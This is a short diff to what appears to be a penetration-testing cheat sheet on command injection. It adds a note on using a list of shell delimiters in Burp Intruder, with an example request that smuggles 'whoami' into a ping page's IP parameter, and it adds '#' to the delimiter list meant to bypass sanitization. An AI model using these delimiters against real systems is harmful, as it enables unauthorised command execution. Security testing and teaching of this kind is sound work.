@@ -8,6 +8,9 @@ Attempt to bypass sanitization??
 Delimiters
 ------------------
 ```bash
+# Use in Burp Intuder
+# eg...
+# ping.php?ip=127.0.0.1%20<delimiter>%20whoami
 &
 &&
 |
@@ -19,6 +22,7 @@ Delimiters
 %0A
 \n
 <
+#
 ```
 Interesting stuff
 -----------------
